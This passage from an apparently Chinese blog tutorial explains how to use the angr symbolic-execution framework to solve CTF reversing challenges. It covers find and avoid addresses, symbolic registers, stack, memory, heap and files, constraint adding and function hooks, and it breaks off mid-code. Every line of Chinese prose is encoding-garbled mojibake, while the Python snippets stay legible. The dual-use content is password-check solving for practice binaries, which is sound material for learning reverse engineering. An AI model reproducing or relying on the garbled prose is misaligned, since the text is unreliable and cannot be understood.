<p><code>simulation</code>ï¼šè·å–æˆ‘ä»¬æ“ä½œçš„å¯¹è±¡ï¼Œä¹‹åçš„æ“ä½œå³å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œæ“ä½œã€‚</p>

        <h2 id="2-è®¾ç½®æ¢ç´¢è·¯å¾„"   >
          <a href="#2-è®¾ç½®æ¢ç´¢è·¯å¾„" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è®¾ç½®æ¢ç´¢è·¯å¾„" class="headerlink" title="2.è®¾ç½®æ¢ç´¢è·¯å¾„"></a>2.è®¾ç½®æ¢ç´¢è·¯å¾„</h2>
      
        <h3 id="1-è®¾ç½®çº¦æŸè·¯å¾„"   >
          <a href="#1-è®¾ç½®çº¦æŸè·¯å¾„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è®¾ç½®çº¦æŸè·¯å¾„" class="headerlink" title="(1)è®¾ç½®çº¦æŸè·¯å¾„"></a>(1)è®¾ç½®çº¦æŸè·¯å¾„</h3>
      
        <h4 id="â‘ é€šè¿‡åœ°å€è®¾ç½®"   >
          <a href="#â‘ é€šè¿‡åœ°å€è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ é€šè¿‡åœ°å€è®¾ç½®" class="headerlink" title="â‘ é€šè¿‡åœ°å€è®¾ç½®"></a>â‘ é€šè¿‡åœ°å€è®¾ç½®</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_good_address = <span class="number">0x8048678</span></span><br><span class="line">avoid_me_address = <span class="number">0x080485A8</span></span><br></pre></td></tr></table></div></figure>

<p>è¡¨å¦‚æœç¨‹åºåˆ°è¾¾<code>print_good_address</code>ï¼Œå³ä»£è¡¨æˆåŠŸè§£é¢˜ï¼Œä¸€èˆ¬é¢˜ä¸­å°±æ˜¯è¾“å‡ºflagçš„åœ°å€ã€‚</p>
<p><code>avoid_me_address</code>åˆ™ç”¨åœ¨éœ€è¦é¿å…åˆ°è¾¾çš„åœ°æ–¹</p>

        <h4 id="â‘¡é€šè¿‡æ‰“å°å†…å®¹è®¾ç½®"   >
          <a href="#â‘¡é€šè¿‡æ‰“å°å†…å®¹è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é€šè¿‡æ‰“å°å†…å®¹è®¾ç½®" class="headerlink" title="â‘¡é€šè¿‡æ‰“å°å†…å®¹è®¾ç½®"></a>â‘¡é€šè¿‡æ‰“å°å†…å®¹è®¾ç½®</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_output:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span>  stdout_output:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>    </span><br></pre></td></tr></table></div></figure>

<p>å½“ç¨‹åºä¸­æœ‰å¤šä¸ªæ­£ç¡®è¾“å‡ºçš„æ—¶å€™ï¼Œè·å–ç¨‹åºè¾“å‡ºï¼Œå¦‚æœè¾“å‡ºä¸­åŒ…å«æ ‡å¿—æ€§çš„ç¬¦å·<code>Good Job</code>ï¼Œåˆ™ä»£è¡¨æˆåŠŸåˆ°è¾¾ï¼Œæˆ–è€…è®¾ç½®å…¶ä»–çš„æ ‡å¿—æ€§ç¬¦å·ã€‚æˆ–è€…å½“ç¨‹åºä¸­æœ‰å¤šä¸ªç›¸åŒçš„é”™è¯¯è¾“å‡ºçš„æ—¶å€™ï¼Œè·å–ç¨‹åºè¾“å‡ºï¼Œå¦‚æœè¾“å‡ºä¸­åŒ…å«æ ‡å¿—æ€§çš„ç¬¦å·<code>Try Again</code>ï¼Œåˆ™ä»£è¡¨åº”è¯¥éœ€è¦é¿å…çš„åœ°æ–¹ï¼Œè€Œä¸ç”¨è¾“å…¥å¤šä¸ªåœ°å€ã€‚</p>

        <h4 id="â‘¢è®¾ç½®å‘é‡"   >
          <a href="#â‘¢è®¾ç½®å‘é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢è®¾ç½®å‘é‡" class="headerlink" title="â‘¢è®¾ç½®å‘é‡"></a>â‘¢è®¾ç½®å‘é‡</h4>
      <p>ä¸€èˆ¬è€Œè¨€ï¼Œå¯èƒ½è¾“å…¥çš„é•¿åº¦æˆ–è€…å­—ç¬¦æœ‰äº›é™åˆ¶ï¼Œæ¯”å¦‚scanfçš„æ ¼å¼åŒ–è·å–è¾“å…¥ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å‘é‡ç”Ÿæˆé™åˆ¶æ€§çš„è¾“å…¥å­—ç¬¦ï¼Œç¼©å°æœç´¢è·¯å¾„</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line">passwd_size_in_bits = <span class="number">32</span></span><br><span class="line">passwd0 = claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>, passwd_size_in_bits)</span><br><span class="line">passwd1 = claripy.BVS(<span class="string">&#x27;passwd1&#x27;</span>, passwd_size_in_bits)</span><br><span class="line">passwd2 = claripy.BVS(<span class="string">&#x27;passwd2&#x27;</span>, passwd_size_in_bits)</span><br></pre></td></tr></table></div></figure>

<p>è®¾ç½®äº†ä¸‰ä¸ªå‘é‡ï¼Œé•¿åº¦ä¸º32bit</p>
<p><code>BVS()</code>ï¼šä»£è¡¨ä½å‘é‡åˆ›å»º</p>
<p><code>FPS()</code>ï¼šä»£è¡¨ç¬¦å·å‘é‡åˆ›å»º</p>

        <h4 id="â‘£è®¾ç½®å¯„å­˜å™¨"   >
          <a href="#â‘£è®¾ç½®å¯„å­˜å™¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘£è®¾ç½®å¯„å­˜å™¨" class="headerlink" title="â‘£è®¾ç½®å¯„å­˜å™¨"></a>â‘£è®¾ç½®å¯„å­˜å™¨</h4>
      <p>å½“ç¨‹åºæœ‰æ—¶å€™ä¸éœ€è¦ä»å¤´å¼€å§‹ï¼Œè€Œæ˜¯åªæµ‹è¯•æŸä¸ªåœ°æ–¹æˆ–è€…åœ¨æŸä¸ªåœ°æ–¹éœ€è¦æ›´æ”¹å¯„å­˜å™¨æ—¶ï¼Œå¯ä»¥è¿›è¡Œè®¾ç½®</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line">initial_state.regs.eax = passwd0</span><br><span class="line">initial_state.regs.ebx = passwd1</span><br><span class="line">initial_state.regs.edx = passwd2</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¤è®¾ç½®æ ˆä¸Šçš„æ•°æ®"   >
          <a href="#â‘¤è®¾ç½®æ ˆä¸Šçš„æ•°æ®" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¤è®¾ç½®æ ˆä¸Šçš„æ•°æ®" class="headerlink" title="â‘¤è®¾ç½®æ ˆä¸Šçš„æ•°æ®"></a>â‘¤è®¾ç½®æ ˆä¸Šçš„æ•°æ®</h4>
      
        <h5 id="A-å…ˆè®¾ç½®æ ˆå¸§æŒ‡é’ˆ"   >
          <a href="#A-å…ˆè®¾ç½®æ ˆå¸§æŒ‡é’ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å…ˆè®¾ç½®æ ˆå¸§æŒ‡é’ˆ" class="headerlink" title="A.å…ˆè®¾ç½®æ ˆå¸§æŒ‡é’ˆ"></a>A.å…ˆè®¾ç½®æ ˆå¸§æŒ‡é’ˆ</h5>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line">initial_state.regs.ebp = initial_state.regs.esp *<span class="comment">#EBP=ESP*</span></span><br></pre></td></tr></table></div></figure>


        <h5 id="B-è§‚å¯Ÿæ ˆä¸Šæ•°æ®ï¼Œç„¶åè¿›è¡Œè®¾ç½®"   >
          <a href="#B-è§‚å¯Ÿæ ˆä¸Šæ•°æ®ï¼Œç„¶åè¿›è¡Œè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-è§‚å¯Ÿæ ˆä¸Šæ•°æ®ï¼Œç„¶åè¿›è¡Œè®¾ç½®" class="headerlink" title="B.è§‚å¯Ÿæ ˆä¸Šæ•°æ®ï¼Œç„¶åè¿›è¡Œè®¾ç½®"></a>B.è§‚å¯Ÿæ ˆä¸Šæ•°æ®ï¼Œç„¶åè¿›è¡Œè®¾ç½®</h5>
      <p>æ¯”å¦‚å¦‚ä¸‹æƒ…å½¢ï¼Œéœ€è¦0x8çš„æ ˆç©ºé—´</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129153552.png"></p>
<p>é‚£ä¹ˆå…ˆå°†espæ”¾åˆ°ebp-0x8çš„ä½ç½®</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line">padding_length_in_bytes = <span class="number">0x08</span></span><br><span class="line">initial_state.regs.esp -= padding_length_in_bytes</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åè®¾ç½®å‘é‡ï¼Œå‹å…¥æ ˆä¸­</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line">passwd0 = claripy.BVS(<span class="string">&#x27;var_10&#x27;</span>, <span class="number">32</span>) <span class="comment">#s1</span></span><br><span class="line">passwd1 = claripy.BVS(<span class="string">&#x27;var_C&#x27;</span>, <span class="number">32</span>) <span class="comment">#s2</span></span><br><span class="line"><span class="comment">#var_10åªä»£è¡¨name</span></span><br><span class="line"></span><br><span class="line">initial_state.stack_push(passwd0) </span><br><span class="line">initial_state.stack_push(passwd1)</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å³å¯å®Œæˆæ ˆä¸­æ•°æ®çš„å¸ƒç½®</p>

        <h5 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h5>
      <p>è¿™é‡Œç¬¦å·åŒ–æ ˆä¸Šæ•°æ®æ—¶ï¼Œåªèƒ½ä¸€ä¸ªä¸€ä¸ªpushï¼Œå³32ä½ä¸€æ¬¡pushè¿›4å­—èŠ‚ï¼Œ64ä½ä¸€æ¬¡pushè¿›8å­—èŠ‚ï¼Œä¸èƒ½å¤šï¼Œä¸ç„¶ä¼šé€ æˆç¬¦å·æˆªæ–­ã€‚è¿™é‡Œå…¶å®å¯ä»¥ç›´æ¥é€šè¿‡è·å–rspï¼Œç„¶ååˆ©ç”¨rspæ¥åŠ è½½æ•°æ®å³å¯ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">initial_state.regs.rsp = initial_state.regs.rbp</span><br><span class="line">buf_addr = initial_state.regs.rsp - <span class="number">0x10</span></span><br><span class="line">passwd0 = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">0x8</span> * <span class="number">8</span>)</span><br><span class="line">initial_state.memory.store(buf_addr, passwd0)</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¥ç¬¦å·åŒ–å†…å­˜"   >
          <a href="#â‘¥ç¬¦å·åŒ–å†…å­˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¥ç¬¦å·åŒ–å†…å­˜" class="headerlink" title="â‘¥ç¬¦å·åŒ–å†…å­˜"></a>â‘¥ç¬¦å·åŒ–å†…å­˜</h4>
      <p>å¯»å€éœ€è¦ç¬¦å·åŒ–çš„å†…å­˜åœ°å€ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129163056.png" alt="image-20211129163056788"></p>
<p>å³ç¬¦å·åŒ–å››ä¸ªå…«å­—èŠ‚é•¿åº¦çš„user_input</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">passwd_size_in_bits = <span class="number">64</span></span><br><span class="line">passwd0 = claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>, passwd_size_in_bits)</span><br><span class="line">passwd1 = claripy.BVS(<span class="string">&#x27;passwd1&#x27;</span>, passwd_size_in_bits)</span><br><span class="line">passwd2 = claripy.BVS(<span class="string">&#x27;passwd2&#x27;</span>, passwd_size_in_bits)</span><br><span class="line">passwd3 = claripy.BVS(<span class="string">&#x27;passwd3&#x27;</span>, passwd_size_in_bits)</span><br><span class="line"></span><br><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line">passwd0_address = <span class="number">0xA1BA1C0</span></span><br><span class="line"><span class="comment">#passwd1_address = 0xA1BA1C8</span></span><br><span class="line"><span class="comment">#passwd2_address = 0xA1BA1D0</span></span><br><span class="line"><span class="comment">#passwd3_address = 0xA1BA1D8</span></span><br><span class="line">initial_state.memory.store(passwd0_address, passwd0)</span><br><span class="line">initial_state.memory.store(passwd0_address + <span class="number">0x8</span>,  passwd1)</span><br><span class="line">initial_state.memory.store(passwd0_address + <span class="number">0x10</span>, passwd2)</span><br><span class="line">initial_state.memory.store(passwd0_address + <span class="number">0x18</span>, passwd3)</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¦ç¬¦å·åŒ–å †å†…å­˜"   >
          <a href="#â‘¦ç¬¦å·åŒ–å †å†…å­˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¦ç¬¦å·åŒ–å †å†…å­˜" class="headerlink" title="â‘¦ç¬¦å·åŒ–å †å†…å­˜"></a>â‘¦ç¬¦å·åŒ–å †å†…å­˜</h4>
      <p>å³åœ¨buffer0å’Œbuffer1ä¸­ä¿å­˜çš„æ˜¯mallocå‡ºæ¥çš„å†…å­˜æŒ‡é’ˆ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129164136.png" alt="image-20211129164136483"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129164213.png" alt="image-20211129164213775"></p>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å‘è¿™ä¸¤ä¸ªbufä¸­å†™å…¥å†…å­˜åœ°å€ï¼Œç„¶åæŠŠéœ€è¦ç¬¦å·åŒ–çš„å†…å­˜å†™å…¥åˆ°å¯¹åº”çš„å†…å­˜åœ°å€ä¸­ï¼Œè¿™é‡Œé€‰å–çš„å†…å­˜åœ°å€è®¾ç½®ä¸º</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_heap_address0 = <span class="number">0xffffc93c</span></span><br><span class="line">fake_heap_address1 = <span class="number">0xffffc94c</span></span><br></pre></td></tr></table></div></figure>

<p>æœ€ç»ˆå¦‚ä¸‹è®¾ç½®</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line">fake_heap_address0 = <span class="number">0xffffc93c</span></span><br><span class="line">pointer_to_malloc_memory_address0 = <span class="number">0xabcc8a4</span></span><br><span class="line">fake_heap_address1 = <span class="number">0xffffc94c</span></span><br><span class="line">pointer_to_malloc_memory_address1 = <span class="number">0xabcc8ac</span></span><br><span class="line">initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)</span><br><span class="line">initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">initial_state.memory.store(fake_heap_address0, passwd0)  </span><br><span class="line">initial_state.memory.store(fake_heap_address1, passwd1)</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘§ç¬¦å·åŒ–æ–‡ä»¶"   >
          <a href="#â‘§ç¬¦å·åŒ–æ–‡ä»¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘§ç¬¦å·åŒ–æ–‡ä»¶" class="headerlink" title="â‘§ç¬¦å·åŒ–æ–‡ä»¶"></a>â‘§ç¬¦å·åŒ–æ–‡ä»¶</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line"><span class="comment">#64ä¸ªå­—èŠ‚</span></span><br><span class="line">symbolic_file_size_bytes = <span class="number">64</span></span><br><span class="line"><span class="comment">#åˆ›å»ºæ–‡ä»¶å‘é‡</span></span><br><span class="line">passwd0 = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, symbolic_file_size_bytes * <span class="number">8</span>)</span><br><span class="line">passwd_file = angr.storage.SimFile(filename, content=passwd0, size=symbolic_file_size_bytes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line"><span class="comment">#å°†æ–‡ä»¶å‘é‡æ’å…¥</span></span><br><span class="line">initial_state.fs.insert(filename, passwd_file)</span><br></pre></td></tr></table></div></figure>








        <h2 id="3-çº¦æŸæ¯”è¾ƒå‡½æ•°"   >
          <a href="#3-çº¦æŸæ¯”è¾ƒå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-çº¦æŸæ¯”è¾ƒå‡½æ•°" class="headerlink" title="3.çº¦æŸæ¯”è¾ƒå‡½æ•°"></a>3.çº¦æŸæ¯”è¾ƒå‡½æ•°</h2>
      <p>å½“åœ¨å¾ªç¯é‡Œè¿›è¡Œæ¯”è¾ƒåˆ¤æ–­æ˜¯ï¼Œä¼šäº§ç”Ÿå¾ˆå¤šåˆ†æ”¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">check</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == *(_BYTE *)(i + <span class="number">0x804A040</span>) )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„a2=16ï¼Œå³å°†16ä¸ªå­—ç¬¦éƒ½æ‹¿å‡ºæ¥é€ä¸ªæ¯”è¾ƒï¼Œæ¯æ¬¡æ¯”è¾ƒäº§ç”Ÿä¸¤ä¸ªåˆ†æ”¯ï¼Œ16æ¬¡æ¯”è¾ƒå°±ä¼šäº§ç”Ÿ2^16=65536ä¸ªåˆ†æ”¯ï¼Œä¼šä½¿å¾—åˆ†æ”¯å˜å¾—å¾ˆå¤§ï¼Œä½†æ˜¯è¿™é‡Œå…¶å®åªæ˜¯ä¸€ä¸ªæ¯”è¾ƒå‡½æ•°ï¼Œä¿è¯a1ä»£è¡¨å­—ç¬¦ä¸²çš„å†…å®¹å’Œ<code>0x804A040</code>ä¸­ä¿å­˜çš„å­—ç¬¦ä¸²å†…å®¹ç›¸ç­‰å°±å¯ä»¥äº†ï¼Œè¿™é‡Œå°±å¯ä»¥è¿è¡Œåˆ°è¯¥å‡½æ•°ä¹‹å‰ï¼Œç„¶åè‡ªå·±è·å–å¯¹åº”å†…å­˜ä¸­å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæ·»åŠ é™åˆ¶å³å¯ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#initial_state = project.factory.blank_state(addr=start_address)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#buff_addrä¸­ä¿å­˜çš„å³ä¸ºæˆ‘ä»¬è¿è¡Œåˆ°æ¯”è¾ƒå‡½æ•°ä¹‹å‰å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œä½¿ä¹‹ä¸0x804A040ä¸­çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">buff_addr = <span class="number">0x0804A050</span></span><br><span class="line">address_to_check_constraint = <span class="number">0x08048565</span></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line"><span class="comment">#æ¢ç´¢è·¯å¾„åˆ°è¿›å…¥æ¯”è¾ƒå‡½æ•°ä¹‹å‰</span></span><br><span class="line">simulation.explore(find=address_to_check_constraint)</span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    constrained_parameter_address = buff_addr</span><br><span class="line">    constrained_parameter_size_bytes = <span class="number">16</span></span><br><span class="line">    constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_address,constrained_parameter_size_bytes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x804A040ä¸­ä¿å­˜çš„å³ä¸º&quot;AUPDNNPROEZRJWKB&quot;</span></span><br><span class="line">constrained_parameter_desired_value = <span class="string">&#x27;AUPDNNPROEZRJWKB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ¯”è¾ƒçº¦æŸï¼Œè·å¾—ä½¿ä¸¤å€¼ç›¸ç­‰çš„ç¬¦å·é‡</span></span><br><span class="line">solution_state.solver.add(constrained_parameter_bitvector == constrained_parameter_desired_value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾—åˆ°æœ€ç»ˆè§£</span></span><br><span class="line">solution0 = solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>)</span><br></pre></td></tr></table></div></figure>




        <h2 id="4-ä½¿ç”¨HOOKå‡½æ•°"   >
          <a href="#4-ä½¿ç”¨HOOKå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ä½¿ç”¨HOOKå‡½æ•°" class="headerlink" title="4.ä½¿ç”¨HOOKå‡½æ•°"></a>4.ä½¿ç”¨HOOKå‡½æ•°</h2>
      
        <h3 id="1-åˆ©ç”¨åœ°å€è¿›è¡Œhook"   >
          <a href="#1-åˆ©ç”¨åœ°å€è¿›è¡Œhook" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ©ç”¨åœ°å€è¿›è¡Œhook" class="headerlink" title="(1)åˆ©ç”¨åœ°å€è¿›è¡Œhook"></a>(1)åˆ©ç”¨åœ°å€è¿›è¡Œhook</h3>
      <p>å³ç”¨è‡ªå·±ç¼–å†™çš„å‡½æ•°æ›¿ä»£ç¨‹åºä¸­çš„å‡½æ•°æ¥æ‰§è¡Œï¼Œå‡è®¾è¿™é‡Œæƒ³hookæ‰ä»¥ä¸‹å‡½æ•°ï¼Œè¯¥å‡½æ•°å³ä¸ºä¹‹å‰çš„æ¯”è¾ƒå‡½æ•°check</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211129172222.png" alt="image-20211129172222733"></p>
<p>é‚£ä¹ˆçœ‹å­—èŠ‚ç å¯çŸ¥å¯¹åº”çš„å‡½æ•°ä¸º5ä¸ªå­—èŠ‚ï¼Œåœ°å€ä¸º<code>0x80486B3</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">check_equals_called_address = <span class="number">0x80486B3</span></span><br><span class="line">instruction_to_skip_length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ•´ä½“</span></span><br><span class="line"><span class="comment">#åˆ©ç”¨hookå‡½æ•°è¿›è¡Œæ›¿æ¢</span></span><br><span class="line"><span class="meta">@project.hook(<span class="params">check_equals_called_address, length=instruction_to_skip_length</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">skip_check_equals_</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment">#å‡½æ•°çš„è¾“å…¥å‚æ•°</span></span><br><span class="line">    user_input_buffer_address = <span class="number">0x804A054</span></span><br><span class="line">    user_input_buffer_length = <span class="number">16</span></span><br><span class="line">    user_input_string = state.memory.load(</span><br><span class="line">        user_input_buffer_address,</span><br><span class="line">        user_input_buffer_length,</span><br><span class="line">        endness=archinfo.Endness.LE</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">#ä¸€èˆ¬éƒ½æ˜¯å°ç«¯ï¼Œå¤§ç«¯:BE</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#éœ€è¦æ¯”è¾ƒçš„å­—ç¬¦ä¸²</span></span><br><span class="line">    check_against_string = <span class="string">&#x27;XKSPZSJKJYQCQXZV&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span 